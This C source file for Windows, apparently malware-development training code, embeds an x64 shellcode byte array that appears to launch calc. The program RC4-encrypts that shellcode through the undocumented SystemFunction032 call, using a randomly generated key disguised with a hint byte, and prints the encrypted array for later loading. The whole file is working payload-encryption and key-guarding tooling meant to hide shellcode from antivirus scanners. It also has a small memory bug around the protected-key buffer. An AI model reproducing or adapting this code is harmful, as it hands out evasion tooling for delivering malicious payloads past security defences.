#include <Windows.h>
#include <stdio.h>

unsigned char Payload[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};

char* HexToString(const unsigned char* data, size_t length) {

	size_t totalLength = length * 6 + 3;

	char* result = (char*)malloc(totalLength);

	if (result == NULL) {
		exit(EXIT_FAILURE);
	}

	int offset = 0;
	offset += snprintf(result + offset, totalLength - offset, "{ ");
	for (size_t i = 0; i < length; i++) {
		if (i > 0) {
			offset += snprintf(result + offset, totalLength - offset, ", ");
		}
		offset += snprintf(result + offset, totalLength - offset, "0x%02X", data[i]);
	}
	offset += snprintf(result + offset, totalLength - offset, " }");

	return result;
}

unsigned char* GenerateProtectedKey(const unsigned char HintByte, const size_t sKey) {

	srand((unsigned int)time(NULL));

	const unsigned char b = (unsigned char)(rand() % 0xFF);

	unsigned char* pOriginalKey = (unsigned char*)malloc(sKey);

	if (!pOriginalKey) {
		exit(EXIT_FAILURE);
	}

	printf("[+] Generated Key Byte : 0x%0.2X \n\n", b);

	pOriginalKey[0] = HintByte;

	for (size_t i = 1; i < sKey; i++) {
		pOriginalKey[i] = (unsigned char)(rand() % 0xFF);
	}

	printf("[+] Original Key : ");
	char* pOriginalKeyString = HexToString(pOriginalKey, sKey);
	printf("%s\n", pOriginalKeyString);
	free(pOriginalKeyString);

	unsigned char* pProtectedKey = (unsigned char*)malloc(sKey);

	if (!pProtectedKey) {
		exit(EXIT_FAILURE);
	}

	for (size_t i = 0; i < sKey; i++) {
		pProtectedKey[i] = (unsigned char)((pOriginalKey[i] + i) ^ b);
	}

	printf("\n");

	pProtectedKey = HexToString(pProtectedKey, sKey);
	printf("[+] Protected Key : ");
	printf("%s\n", pProtectedKey);
	free(pProtectedKey);

	return pOriginalKey;
}


unsigned char* OriginalKey() {

	srand((unsigned int)time(NULL));

	unsigned char hintByte = 0x61;
	size_t keySize = 16;

	printf("[+] Hint Byte : 0x%0.2X \n\n", hintByte);
	printf("[+] Key Size : %zu \n\n", keySize);

	unsigned char* originalKey = GenerateProtectedKey(hintByte, keySize);

	return originalKey;
}

typedef struct
{
	DWORD	Length;
	DWORD	MaximumLength;
	PVOID	Buffer;

} USTRING;


typedef NTSTATUS(NTAPI* fnSystemFunction032)(
	struct USTRING* Data,
	struct USTRING* Key
	);


BOOL Rc4EncryptionViSystemFunc032(PBYTE pRc4Key, PBYTE pPayloadData, DWORD dwRc4KeySize, DWORD sPayloadSize) {

	NTSTATUS	STATUS = NULL;

	USTRING		Key = { .Buffer = pRc4Key, 		.Length = dwRc4KeySize,		.MaximumLength = dwRc4KeySize },
		Data = { .Buffer = pPayloadData, 	.Length = sPayloadSize,		.MaximumLength = sPayloadSize };

	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");

	if ((STATUS = SystemFunction032(&Data, &Key)) != 0x0) {
		printf("[!] SystemFunction032 FAILED With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}

	return TRUE;
}

void PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size) {

	printf("unsigned char %s[] = {", Name);

	for (int i = 0; i < Size; i++) {
		if (i % 16 == 0) {
			printf("\n\t");
		}
		if (i < Size - 1) {
			printf("0x%0.2X, ", Data[i]);
		}
		else {
			printf("0x%0.2X ", Data[i]);
		}
	}

	printf("};\n\n");

}

int main() {

	unsigned char* pOriginalKey = OriginalKey();

	if (!Rc4EncryptionViSystemFunc032(pOriginalKey, Payload, 16, sizeof(Payload))) {
		return -1;
	}

	printf("\n");
	PrintHexData("Rc4EncryptedPayload", Payload, sizeof(Payload));

	printf("[#] Press <Enter> To Quit ... ");
	getchar();

	return 0;
}